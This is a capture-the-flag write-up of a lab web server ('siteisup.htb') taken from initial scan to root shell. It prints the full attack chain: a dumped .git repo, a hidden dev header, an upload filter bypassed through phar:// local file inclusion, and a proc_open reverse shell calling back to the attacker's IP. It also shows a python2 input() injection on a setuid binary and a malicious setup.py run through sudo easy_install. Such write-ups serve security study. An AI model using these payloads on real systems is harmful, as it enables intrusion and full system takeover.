
## Initial Enum

```bash
rustscan -a 10.129.55.81 -r 1-65535 --ulimit 5000
```

```
Open 10.129.55.81:22
Open 10.129.55.81:80
```

```bash
nmap -sC -sV -T5 -v -p22,80 10.129.55.81
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80

Checking the website
![](pics/Pasted%20image%2020260907220440.png)

This looks like a website that would test if your website is up by ping it. Maybe this is vulnerable to command injection??

The first thing I tried is opening a python http server

```bash
python3 -m http.server 80
```

Then tested it via the website

![](pics/Pasted%20image%2020260907221415.png)

So the website send a request to the given site. After hour of going down the rabbit hole of finding a command injection. I moved on and started a directory brute force

```bash
feroxbuster --url http://10.129.55.81/
```

![](pics/Pasted%20image%2020260908103236.png)

I found a `dev` endpoint so I did another brute force on that directory too.

```bash
feroxbuster --url http://10.129.55.81/dev/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
```

![](pics/Pasted%20image%2020260908103326.png)

Found a github repo.

![](pics/Pasted%20image%2020260908103454.png)

git config file

![](pics/Pasted%20image%2020260908104151.png)
## Dump the git repo

Using git-dumper to dump the source code

```bash
git-dumper http://10.129.55.81/dev/.git/ website
```

![](pics/Pasted%20image%2020260908110236.png)

After checking the changelog I found out that the website have a upload file functionality

![](pics/Pasted%20image%2020260908110423.png)

The source code

```php
<?php
if(DIRECTACCESS){
	die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
		</form>

<?php

function isitup($url){
	$ch=curl_init();
	curl_setopt($ch, CURLOPT_URL, trim($url)); // that is why our command injection failed 
	curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$f = curl_exec($ch);
	$header = curl_getinfo($ch);
	if($f AND $header['http_code'] == 200){
		return array(true,$f);
	}else{
		return false;
	}
    curl_close($ch);
}

if($_POST['check']){
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
	
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	} 
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
    # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
	
	# Read the uploaded file.
	$websites = explode("\n",file_get_contents($final_path));
	
	foreach($websites as $site){
		$site=trim($site);
		if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
			$check=isitup($site);
			if($check){
				echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
			}else{
				echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
			}	
		}else{
			echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
		}
	}
	# Delete the uploaded file.
	@unlink($final_path);
}

function getExtension($file) {
	$extension = strrpos($file,".");
	return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

Checking this php code I found a couple attacks I can try but first I got to find the endpoint that this code is hosted on. 
Like here I know the directory in which the file is uploaded to.

```php
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
```

## Check the commit history

Next, I am checking the commit history for interesting information using

```bash
git log
```

![](pics/Pasted%20image%2020260908134548.png)

```
commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.
```

I need to explore these commits and see how to reach this `vhost`

To leave the history alone and explore the old files without effecting the current files

```bash
git checkout -b review-branch 8812785e31c879261050e72e20f298ae8c43b565
```

## Found the secret header

![](pics/Pasted%20image%2020260908134925.png)

![](pics/Pasted%20image%2020260908134945.png)

review the second commit

```bash
git checkout -b review-branch2 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
```

![](pics/Pasted%20image%2020260908135046.png)

So now we know that we need a special header

```
Special-Dev: "only4dev"
```

## Explore the subdomains

Perform the request

![](pics/Pasted%20image%2020260908135543.png)

Now lets fuzz VHOST using ffuf

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://siteisup.htb/ -H "Host: FUZZ.siteisup.htb"
```

![](pics/Pasted%20image%2020260908140956.png)

I got a lot of false positive so I filtered with file size:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://siteisup.htb/ -H "Host: FUZZ.siteisup.htb" -fs 1131
```

![](pics/Pasted%20image%2020260908141039.png)

Now we got the subdomain to access php code. Lets configure our proxy to add the dev header automatically so we can browse the website freely

![](pics/Pasted%20image%2020260908145931.png)

Now lets access the website also add `dev.siteisup.htb` to the `/etc/hosts` file.

![](pics/Pasted%20image%2020260908150049.png)

## Exploitation phase

Now we can upload files to the server but how can we execute it......

![](pics/Pasted%20image%2020260908191624.png)

As we saw on the source of the `checker` we can not upload `php` files so we need another approach, Looked up into the `index.php`.

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

This script include `php` files which is vulnerable to `LFI` with this we can execute the file we uploaded earlier but the file is `txt`??? we can bypass that using the compressed `php` URI called `phar://`:
- Zip the `php` file we want to execute
- Upload it using the `checker.php`

My reverse `php` shell did not work so I had to debug using the `phpinfo()` function
I created a file called `test.php` and typed this inside it.

```php
<?php phpinfo(); ?>
```

Then zipped it

```bash
zip payload.pchar test.php
```

Upload it to the server

![](pics/Pasted%20image%2020260909133500.png)
Took the file path inside the server from the `uploads` directory

![](pics/Pasted%20image%2020260909133523.png)

Finally using the `phar://` URI scheme we can execute php files inside a compressed zip. Combined with the LFI vulnerable admin panel.....

```
http://dev.siteisup.htb/?page=phar://uploads/d4fc79a8a2e2e809c39e4d2525eb7fba/payload.pchar/test
```

![](pics/Pasted%20image%2020260909133205.png)

That is why our reverse shell did not work because it uses function `pcntl_fork` which is disabled

![](pics/Pasted%20image%2020260909133911.png)


```php
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

Using `dfunc-bypasser` we can find a function that allow RCE.

```bash
./dfunc-bypasser.py --file ~/Desktop/HTB/updown/phpinfo.php
```

![](pics/Pasted%20image%2020260909135854.png)


## Initial shell

Using `proc_open` to get a shell. By editing our old reverse shell `php` file

```php
$shell = '/bin/bash -i >& /dev/tcp/10.10.14.82/9912 0>&1';

$descriptorspec = [
    0 => ["pipe", "r"], // stdin
    1 => ["pipe", "w"], // stdout
    2 => ["pipe", "w"]  // stderr
];
$process = proc_open($shell, $descriptorspec, $pipes);
```

Zip it

```bash
zip payload.phar test.php
```

Upload it

![](pics/Pasted%20image%2020260909144941.png)

Visit the crafted url

```
http://dev.siteisup.htb/?page=phar://uploads/14d21da0c441d01017bf90e890fd629a/payload.phar/test
```


![](pics/Pasted%20image%2020260909144910.png)

Checked the flag but I do not have permission to view it.

![](pics/Pasted%20image%2020260909145208.png)

First lets upgrade the shell:

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```


## PrivEsc to developer

After exploring the developer user directory I found this elf

![](pics/Pasted%20image%2020260909151138.png)

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

Since the compiled version of the siteisup python script has set uid. meaning it is executed as developer.  Also the fact that the script is written in python2. 

![](pics/Pasted%20image%2020260909155831.png)

payload

```
# payload
'__import__("os").system("bash")'
```

![](pics/Pasted%20image%2020260909160026.png)

And now we are the developer! But still I can not read the flag....

![](pics/Pasted%20image%2020260909160204.png)

Using these commands to inspect

```bash
id
ls -la
```

![](pics/Pasted%20image%2020260909160242.png)

Turns the user id changed but the group id still did not and the developer group is the only group that can read the flag. Lets pivot to ssh using the `id_rsa` key

![](pics/Pasted%20image%2020260909160500.png)

Paste it in local file in kali, then login via ssh

```
chmod 600 dev_key.rsa 
ssh developer@siteisup.htb -i dev_key.rsa
```

![](pics/Pasted%20image%2020260909160728.png)

## PrivEsc to root

First thing I checked is the sudo permissions

```bash
sudo -l
```

![](pics/Pasted%20image%2020260909160852.png)

the easy_install source

![](pics/Pasted%20image%2020260909161001.png)

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from setuptools.command.easy_install import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

Looking for a way to abuse easy_install

![](pics/Pasted%20image%2020260909161612.png)

First create the python script code to be executed

```bash
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```

![](pics/Pasted%20image%2020260909161710.png)

Now pass the directory where the setup.py is present

```bash
sudo /usr/local/bin/easy_install .
```

![](pics/Pasted%20image%2020260909161851.png)

## Flag 2

![](pics/Pasted%20image%2020260909162052.png)

![](pics/Pasted%20image%2020260909162103.png)

Done.